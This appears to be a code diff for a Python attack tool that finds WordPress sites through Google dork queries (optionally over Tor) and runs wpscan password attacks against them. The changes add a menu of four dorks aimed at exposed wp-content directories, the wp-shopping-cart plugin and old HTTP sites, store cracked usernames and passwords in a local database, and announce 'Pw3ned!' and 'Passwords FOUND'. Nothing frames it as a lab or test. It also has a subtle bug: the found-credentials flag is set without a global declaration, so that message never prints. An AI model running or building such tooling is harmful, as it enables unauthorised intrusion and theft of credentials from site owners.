@@ -14,6 +14,52 @@ from pathlib import Path
 from termcolor import colored
 from subprocess import check_output
 from prettytable import from_db_cursor
+from prettytable import PrettyTable
+
+
+def showdorks():
+    """Show Wordpress google dorks available and returns choosen"""
+
+    # Get all Wordpress sites general query
+    dork1 = "\"index of\" inurl:wp-content/\""
+    # Get all Wordpress sites using wp-shopping-cart plugin
+    dork2 = "\"inurl:\"/wp-content/plugins/wp-shopping-cart/\""
+    # Get all Wordpress HTTP older sites (exclude pdf files from results)
+    dork3 = "inurl:wp-content/ inurl:http before:2016 -filetype.pdf"
+    # Get all Wordpress sites another general query
+    dork4 = "\"index of \":wp-content/ intitle:\"WordPress\""
+
+    table = PrettyTable()
+
+    table.field_names = ["NUM", "DORK", "INFO"]
+
+    table.add_row([1, dork1, "Wordpress general query"])
+    table.add_row([2, dork2, "Wordpress wp-shopping-cart plugin"])
+    table.add_row([3, dork3, "Wordpress HTTP older sites"])
+    table.add_row([4, dork4, "Wordpress another general query"])
+
+    print()
+    print(colored(table, 'magenta'))
+    print()
+
+    while True:
+        response = input(colored(" Choose dork to run [1-4] ", 'yellow'))
+        if not response.isnumeric():
+            continue
+        elif int(response) in range(1,5):
+            if int(response) == 1:
+                dork = dork1
+            elif int(response) == 2:
+                dork = dork2
+            elif int(response) == 3:
+                dork = dork3
+            elif int(response) == 4:
+                dork = dork4
+            break
+        else:
+            continue
+
+    return dork
 
 
 def showcreds():
@@ -26,7 +72,7 @@ def showcreds():
         data = from_db_cursor(cur)
 
     print()
-    print(data)
+    print(colored(data, 'magenta'))
     print()
 
     cur.close()
@@ -51,20 +97,23 @@ def showcreds():
 def savecreds(pathfile, url):
     """Save possible credentials to db"""
 
+
     try:
         connection = sqlite3.connect(dbfile)
         cursor = connection.cursor()
         # Reading JSON from file - a nested dict -
         with open(pathfile) as json_file:
             obj_data = json.load(json_file)
-            # Continue only if scan wasn't aborted
+            # If 'password_attack is found then we scanning was completed
             if 'password_attack' in obj_data:
                 for username in obj_data['password_attack']:
+                    # username var will be empty if no creds found so insert will not be triggered
                     if username:
                         print(colored(" * Pw3ned! " + url, 'magenta'))
                         # Write credentials to db
                         cursor.execute("INSERT INTO Credentials VALUES (?, ?, ?)", (username, obj_data['password_attack'][username]['password'], url))
                         connection.commit()
+                        credsfound = True
         cursor.close()
     except sqlite3.Error:
         print(colored(" * Error while connecting to database!", 'red'))
@@ -87,7 +136,7 @@ def googledork(dork, amount, wordlist, usetor):
     """Wordpress google dork"""
 
     print()
-    print(colored(" * Retrieving google results..", 'red'))
+    print(colored(" * Retrieving Google results..", 'red'))
     print()
 
     requ = 0
@@ -141,6 +190,8 @@ def main():
 
     global dbfile
     dbfile = "creds.db"
+    global credsfound
+    credsfound = False
 
     # Check if wpscan is installed
     rc = subprocess.call(['which', 'wpscan'], stdout=subprocess.PIPE)
@@ -172,8 +223,7 @@ def main():
     elif int(response) != 1:
         main()
 
-    # Wordpress google dork
-    dork = "\"index of\" inurl:wp-content/\""
+    dork = showdorks()
 
     while True:
         response = input(colored(" Enter number of results to retrieve: ", 'yellow'))
@@ -230,11 +280,14 @@ def main():
 
     if usetor:
         # Kill TOR
+        print()
         print(colored(" * Killing TOR pid..", 'yellow'))
         os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)
 
-    print()
-    print(colored(" * Completed !", 'yellow'))
+    if credsfound:
+        print(colored(" * Completed - Passwords FOUND!", 'magenta'))
+    else:
+        print(colored(" * Completed - Passwords Not Found", 'red'))
     exit(0)
 
 
